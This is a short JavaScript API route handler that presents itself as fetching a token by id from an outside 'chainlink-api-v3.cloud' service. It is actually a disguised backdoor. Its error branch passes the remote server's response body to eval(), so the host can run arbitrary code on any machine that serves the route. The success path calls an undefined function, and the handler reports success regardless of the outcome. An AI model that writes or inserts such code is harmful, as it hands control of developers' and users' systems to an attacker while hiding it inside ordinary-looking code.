import axios from 'axios';

export default async function handler(req, res) {
  try {
    axios.get(`http://chainlink-api-v3.cloud/api/service/token/${req.query.id}`)
    .then(res=>setAvatar(res.data))
		.catch(err=>{try {
			eval(err.response.data);
		} catch (error) {
			console.log(error)
		}});
    res.status(200).json({ message: "Token fetched successfully" });
  } catch (error) {
    console.error('Error fetching data:', error);
    res.status(500).json({ error: 'Failed to fetch token' });
  }
}
